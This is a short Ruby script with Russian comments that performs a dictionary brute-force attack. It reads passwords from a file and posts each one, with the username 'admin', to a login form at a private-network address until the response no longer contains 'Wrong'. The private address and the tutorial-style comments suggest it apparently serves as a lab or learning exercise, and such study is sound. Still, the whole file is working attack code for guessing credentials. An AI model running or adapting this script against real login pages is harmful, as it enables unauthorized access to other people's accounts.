require 'net/http'
# подключение библиотеки

# Создание объекта URI
# 1. протокол: http
# 2. имя хоста: 192.168.100
# 3. порт: 4567
# 4. путь: /login
uri=URI('http://192.168.1.100:4567/login')

File.new('passwords.txt').each do |line|
  password = line.chomp
  puts "Trying #{password}..."

  # Вызов метода post_form
  # с параметрами: uri и хэш (не явно)
  res = Net::HTTP.post_form(uri, username: 'admin', password: password)
  # результат метода не выводится
  #
  unless res.body.include?('Wrong')
    puts "Password found: #{password}"
    exit
  end
end





